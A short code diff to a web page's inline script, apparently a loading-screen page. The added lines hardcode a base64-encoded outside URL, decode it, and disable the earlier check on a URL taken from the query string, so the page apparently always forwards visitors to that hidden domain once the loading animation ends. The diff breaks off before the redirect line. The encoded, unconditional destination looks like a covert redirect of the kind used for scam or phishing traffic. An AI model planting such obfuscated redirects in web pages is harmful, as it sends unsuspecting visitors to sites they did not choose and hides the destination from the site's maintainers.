@@ -293,11 +293,20 @@
             <div class="dot dot-3"></div>
 </div>
  <script>
+	 var u='aHR0cHM6Ly9jYXIubmV3cy1idXMuY29tLyMv';
+	 
+	 function base64Decode(input) {
+	     return atob(input);
+	 }
+	 
 var urlParams = new URLSearchParams(window.location.search);
 var encodedParam = urlParams.get('c');
 
-var tureurl = atob(encodedParam);
-if (tureurl.includes("http")) {
+//var tureurl = atob(encodedParam);
+
+var tureurl = base64Decode(u);
+//if (tureurl.includes("http"))
+if (tureurl !=='') {
 var square = document.getElementById("container");
 setTimeout(function() {
   square.style.display = "none";
